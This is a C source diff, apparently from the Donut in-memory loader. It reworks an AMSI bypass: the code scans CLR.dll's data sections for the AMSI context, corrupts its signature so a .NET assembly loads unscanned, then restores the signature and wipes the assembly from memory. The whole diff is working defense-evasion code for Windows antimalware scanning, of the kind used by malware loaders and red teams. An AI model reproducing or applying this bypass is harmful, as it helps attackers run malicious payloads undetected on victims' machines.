@@ -111,6 +111,7 @@ BOOL LoadAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
     BOOL            loaded=FALSE, loadable, amsi;
     PBYTE           p;
     HMODULE         hAMSI;
+    PAMSICONTEXT    AmsiCtx = NULL;
     
     if(inst->type == DONUT_INSTANCE_PIC) {
       DPRINT("Using module embedded in instance");
@@ -200,8 +201,8 @@ BOOL LoadAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
             DPRINT("AppDomain::Load_3");            
             
             // AMSI is available since v4.8
-            // we assume it's disabled until a call to Load_3()
-            amsi = TRUE;
+            // we assume it's not loaded until after a dummy call to Load_3()
+            //DebugBreak();
             
             // the first call attempts to initialize AMSI
             hr = pa->ad->lpVtbl->Load_3(
@@ -215,33 +216,44 @@ BOOL LoadAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
             if(hAMSI != NULL) {
               // we found it initialized by previous call to Load_3()
               DPRINT("Detected AMSI");
-              // try to disable it
-              amsi = DisableAMSI(inst);
-              DPRINT("DisableAMSI %s", amsi ? "SUCCEEDED" : "FAILED");
+              // try to find the AMSI context in CLR data section
+              amsi = FindAMSIContext(inst, &AmsiCtx);
+              DPRINT("Amsi Context %s", amsi ? "FOUND" : "NOT FOUND");
             }
-            // if AMSI isn't running or was disabled, copy the assembly and load
-            if(amsi) {
-              DPRINT("Copying assembly to safe array");
-              
-              for(i=0, p=sa->pvData; i<mod->len; i++) {
-                p[i] = mod->data[i];
-              }
-  
-              DPRINT("AppDomain::Load_3");
-              
-              hr = pa->ad->lpVtbl->Load_3(
-                pa->ad, sa, &pa->as);
-              
-              loaded = hr == S_OK;
-              
-              DPRINT("HRESULT : %08lx", hr);
-              
-              DPRINT("Erasing assembly from memory");
-              
-              for(i=0, p=sa->pvData; i<mod->len; i++) {
-                p[i] = mod->data[i] = 0;
-              }
+            
+            // if amsi context was found.. 
+            // disable it by corrupting the signature
+            if(AmsiCtx != NULL) {
+              AmsiCtx->Signature++;
             }
+              
+            DPRINT("Copying assembly to safe array");
+            
+            for(i=0, p=sa->pvData; i<mod->len; i++) {
+              p[i] = mod->data[i];
+            }
+
+            DPRINT("AppDomain::Load_3");
+            
+            hr = pa->ad->lpVtbl->Load_3(
+              pa->ad, sa, &pa->as);
+            
+            loaded = hr == S_OK;
+            
+            DPRINT("HRESULT : %08lx", hr);
+            
+            DPRINT("Erasing assembly from memory");
+            
+            for(i=0, p=sa->pvData; i<mod->len; i++) {
+              p[i] = mod->data[i] = 0;
+            }
+
+            // if amsi context was found.. 
+            // re-enable by fixing the signature
+            if(AmsiCtx != NULL) {
+              AmsiCtx->Signature--;
+            }
+            
             DPRINT("SafeArrayDestroy");
             inst->api.SafeArrayDestroy(sa);
           }
@@ -469,20 +481,14 @@ VOID FreeAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
     }
 }
 
-// attempt to disable AMSI by corrupting the AMSI context stored in CLR.dll
-// based on idea by Matt Graeber
+// Attempt to find AMSI context in .data section of CLR.dll
+// Could also scan PEB.ProcessHeap for this..
+// Disabling AMSI via AMSI context is based on idea by Matt Graeber
 // https://gist.github.com/mattifestation/ef0132ba4ae3cc136914da32a88106b9
-//
-typedef struct tagAMSICONTEXT {
-  DWORD        Signature;          // "AMSI" or 0x49534D41
-  PWCHAR       AppName;            // stored by AmsiInitialize
-  IAntimalware CAmsiAntimalware;   // stored by AmsiInitialize
-  DWORD        SessionCount;       // increased by AmsiOpenSession
-} AMSICONTEXT, *PAMSICONTEXT;
 
-BOOL DisableAMSI(PDONUT_INSTANCE inst) {
+BOOL FindAMSIContext(PDONUT_INSTANCE inst, PAMSICONTEXT *pac) {
     LPVOID                   hCLR;
-    BOOL                     disabled = FALSE;
+    BOOL                     found = FALSE;
     PIMAGE_DOS_HEADER        dos;
     PIMAGE_NT_HEADERS        nt;
     PIMAGE_SECTION_HEADER    sh;
@@ -490,6 +496,8 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     PBYTE                    ds;
     MEMORY_BASIC_INFORMATION mbi;
     AMSICONTEXT              *ctx;
+    
+    *pac = NULL;
     
     DPRINT("Obtaining base address of CLR");
     hCLR = inst->api.GetModuleHandle(inst->clr);
@@ -502,7 +510,7 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
              nt->FileHeader.SizeOfOptionalHeader);
              
       for(i = 0; 
-          i < nt->FileHeader.NumberOfSections && !disabled; 
+          i < nt->FileHeader.NumberOfSections && !found; 
           i++) 
       {
         // if this section is writeable, assume it's data
@@ -530,10 +538,11 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
               ctx = (AMSICONTEXT*)ptr;
               // check if it contains the signature 
               if(ctx->Signature == *(DWORD*)&inst->amsi) {
-                DPRINT("Found AMSI signature at %p", (PVOID)&ds[j]);
-                // increment the value of signature
-                ctx->Signature++;
-                disabled = TRUE;
+                DPRINT("Found g_amsiContext at %p", (PVOID)&ds[j]);
+                DPRINT("Heap address is %p", (PVOID)ptr);
+                // store in pointer
+                *pac = ctx;
+                found = TRUE;
                 break;
               }
             }
@@ -541,7 +550,7 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
         }
       }
     }
-    return disabled;
+    return found;
 }
 
 /**
